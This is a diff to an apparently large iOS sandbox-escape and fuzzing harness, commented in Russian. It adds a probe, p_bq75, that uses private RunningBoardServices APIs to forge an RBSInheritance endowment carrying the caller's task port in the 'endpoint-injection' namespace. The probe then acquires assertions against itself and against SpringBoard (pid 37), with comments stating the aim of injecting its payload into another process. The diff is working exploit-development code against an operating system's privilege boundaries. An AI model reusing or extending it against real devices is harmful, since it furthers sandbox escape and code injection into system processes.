@@ -41376,6 +41376,168 @@ static void p_bq74(void) {
     LOG("[bq74] фоновый запуск...");
 }
 
+// p_bq75 — v225: INHERITANCE-ПРИМИТИВ: acquire с RBSInheritance
+// в attributes (endpoint-injection-namespace) → runningboardd
+// наследует эндоумент целевому. Пробы:
+//   A) наследование НАМ (target=current): initWith…(наш токен) —
+//      подпишем async_didChangeInheritances.
+//   B) наследование ЧУЖОМУ (target=pid 37 SpringBoard) — инъекция
+//      нашего payload в чужой процесс (ос-лог решит гейт).
+static void p_bq75(void) {
+    LOG("[bq75] v225: inheritance-примитив через acquire");
+    fsync(fileno(stderr));
+    dispatch_queue_t q = dispatch_queue_create("bq75.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq75] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) { LOG("[bq75] CONTROL FAILED (§144)"); return; }
+    dlopen("/System/Library/PrivateFrameworks/RunningBoardServices"
+           ".framework/RunningBoardServices", RTLD_LAZY | RTLD_LOCAL);
+    dlopen("/System/Library/PrivateFrameworks/BoardServices"
+           ".framework/BoardServices", RTLD_LAZY | RTLD_LOCAL);
+    fsync(fileno(stderr));
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+    @try {
+        Class tCls = NSClassFromString(@"RBSTarget");
+        Class aCls = NSClassFromString(@"RBSAssertion");
+        Class laCls = NSClassFromString(@"RBSLegacyAttribute");
+        Class iCls = NSClassFromString(@"RBSInheritance");
+        LOG("[bq75] классы: t=%p a=%p la=%p inheritance=%p",
+            tCls, aCls, laCls, iCls);
+        if (!tCls || !aCls || !laCls || !iCls) {
+            LOG("[bq75] классов нет"); return;
+        }
+        // наш mach-токен как endowment (сырые байты порта)
+        mach_port_t self_port = mach_task_self_;
+        NSData *endow = [NSData dataWithBytes:&self_port length:8];
+        // v225: init через _initWithNamespace:environment:encodedEndowment:
+        // originatingIdentifier:attributePath: (5 арга, рантайм-карта §220)
+        SEL iiSel = NSSelectorFromString(
+            @"_initWithNamespace:environment:encodedEndowment:"
+            "originatingIdentifier:attributePath:");
+        id inh = nil;
+        if ([iCls instancesRespondToSelector:iiSel]) {
+            typedef id (*IFn)(id, SEL, NSString *, NSString *,
+                              NSData *, NSString *, NSString *);
+            IFn f = (IFn)objc_msgSend;
+            inh = f([iCls alloc], iiSel,
+                    @"com.apple.boardservices.endpoint-injection",  // namespace
+                    @"(none)",                                       // environment
+                    endow,                                           // encodedEndowment
+                    @"bq75-probe",                                   // origID
+                    @"");                                            // attributePath
+        }
+        if (!inh) {
+            typedef id (*IFn2)(id, SEL);
+            IFn2 f2 = (IFn2)objc_msgSend;
+            inh = f2([iCls alloc], @selector(init));
+            LOG("[bq75] init с 5 арг недоступен — init=%s",
+                inh ? "OK" : "(nil)");
+        }
+        LOG("[bq75] inheritance=%s", inh ? @"OK" : @"(nil)");
+        if (inh) {
+            LOG("[bq75] inh desc=%.180s", [inh description].UTF8String ?: "?");
+        }
+        if (!inh) { LOG("[bq75] стоп"); return; }
+
+        typedef id (*CFn)(Class, SEL);
+        CFn cf = (CFn)objc_msgSend;
+        typedef id (*AFn)(Class, SEL, unsigned long long, unsigned long long);
+        AFn af = (AFn)objc_msgSend;
+        id la = af(laCls, @selector(attributeWithReason:flags:), 4ull, 1ull);
+        typedef id (*IFn)(id, SEL, NSString *, id, NSArray *);
+        IFn f3 = (IFn)objc_msgSend;
+
+        // A) наследование НАМ (target=current)
+        {
+            id tgt = cf(tCls, @selector(currentProcess));
+            id as = f3([aCls alloc],
+                       @selector(initWithExplanation:target:attributes:),
+                       @"bq75 inheritance-self", tgt, @[la, inh]);
+            NSError *err = nil;
+            typedef BOOL (*AFn2)(id, SEL, NSError **);
+            AFn2 aq = (AFn2)objc_msgSend;
+            BOOL ok = aq(as, @selector(acquireWithError:), &err);
+            LOG("[bq75] A(self): acquire+inheritance -> %d err=%s",
+                (int)ok, err ? err.localizedDescription.UTF8String : "(none)");
+            usleep(3000000);
+            SEL vldSel = @selector(isValid);
+            BOOL vld = [as respondsToSelector:vldSel]
+                ? ((BOOL (*)(id, SEL))objc_msgSend)(as, vldSel) : NO;
+            LOG("[bq75] A(self): +3s valid=%d", (int)vld);
+            [as invalidate];
+        }
+        // A0) КОНТРОЛЬ: la-соло (эффективность детектора §144)
+        {
+            id tgt0 = cf(tCls, @selector(currentProcess));
+            id as0 = f3([aCls alloc],
+                        @selector(initWithExplanation:target:attributes:),
+                        @"bq75 ctl-la-solo", tgt0, @[la]);
+            NSError *err0 = nil;
+            typedef BOOL (*AFn2)(id, SEL, NSError **);
+            AFn2 aq0 = (AFn2)objc_msgSend;
+            BOOL ok0 = aq0(as0, @selector(acquireWithError:), &err0);
+            LOG("[bq75] A0(la-соло КОНТРОЛЬ): acquire -> %d err=%s", (int)ok0,
+                err0 ? err0.localizedDescription.UTF8String : "(none)");
+            [as0 invalidate];
+        }
+        // A2) inheritance-СОЛО в attributes (без la)
+        {
+            id tgt2 = cf(tCls, @selector(currentProcess));
+            id as2 = f3([aCls alloc],
+                        @selector(initWithExplanation:target:attributes:),
+                        @"bq75 inh-solo", tgt2, @[inh]);
+            NSError *err2 = nil;
+            typedef BOOL (*AFn2)(id, SEL, NSError **);
+            AFn2 aq2 = (AFn2)objc_msgSend;
+            BOOL ok2 = aq2(as2, @selector(acquireWithError:), &err2);
+            LOG("[bq75] A2(inh-соло): acquire -> %d err=%s", (int)ok2,
+                err2 ? err2.localizedDescription.UTF8String : "(none)");
+            usleep(2000000);
+            [as2 invalidate];
+        }
+        // B) наследование ЧУЖОМУ (target=37)
+        {
+            typedef id (*PFn)(Class, SEL, int);
+            PFn pf = (PFn)objc_msgSend;
+            id tgt37 = pf(tCls, @selector(targetWithPid:), 37);
+            id as37 = f3([aCls alloc],
+                         @selector(initWithExplanation:target:attributes:),
+                         @"bq75 inheritance-springboard", tgt37,
+                         @[la, inh]);
+            NSError *err = nil;
+            typedef BOOL (*AFn2)(id, SEL, NSError **);
+            AFn2 aq = (AFn2)objc_msgSend;
+            BOOL ok = aq(as37, @selector(acquireWithError:), &err);
+            LOG("[bq75] B(SpringBoard): acquire+inheritance -> %d err=%s",
+                (int)ok, err ? err.localizedDescription.UTF8String : "(none)");
+            usleep(3000000);
+            SEL vldSel = @selector(isValid);
+            BOOL vld = [as37 respondsToSelector:vldSel]
+                ? ((BOOL (*)(id, SEL))objc_msgSend)(as37, vldSel) : NO;
+            LOG("[bq75] B(SpringBoard): +3s valid=%d — ос_лог "
+                "runningboardd: inheritance-записи от нашего pid", (int)vld);
+            [as37 invalidate];
+        }
+        LOG("[bq75] done — ос_лог решит: применил ли демон наследование "
+            "(endpoint-injection от sandboxed originator)");
+    } @catch (NSException *e) {
+        LOG("[bq75] ИСКЛ: %s — %s", e.name.UTF8String ?: "?",
+            e.reason ? e.reason.UTF8String : "?");
+    }
+    });
+    LOG("[bq75] фоновый запуск...");
+}
+
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
 // отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
@@ -48876,6 +49038,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ72")) { p_bq72(); LOG("[probe13] bq72-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ73")) { p_bq73(); LOG("[probe13] bq73-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ74")) { p_bq74(); LOG("[probe13] bq74-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ75")) { p_bq75(); LOG("[probe13] bq75-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
